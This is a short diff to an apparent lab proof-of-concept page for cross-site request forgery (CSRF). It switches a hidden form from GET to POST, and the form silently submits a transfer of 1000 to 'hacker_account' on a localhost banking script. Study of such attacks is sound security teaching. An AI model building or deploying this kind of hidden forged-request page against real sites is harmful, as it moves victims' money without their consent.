@@ -12,9 +12,10 @@
 
         <!-- Formulaire de soumission de la requête de transfert -->
         <!-- On a recopié le formulaire officiel, mais volontairement on ne l'affiche pas -->
+        <!-- On passe à POST -->
         <form name="csrf_form"
               action="http://localhost:8080/transfert.php"
-              method="GET"
+              method="POST"
               style="display:none;">
             <input type="hidden" name="amount" value="1000">
             <input type="hidden" name="recipient" value="hacker_account">
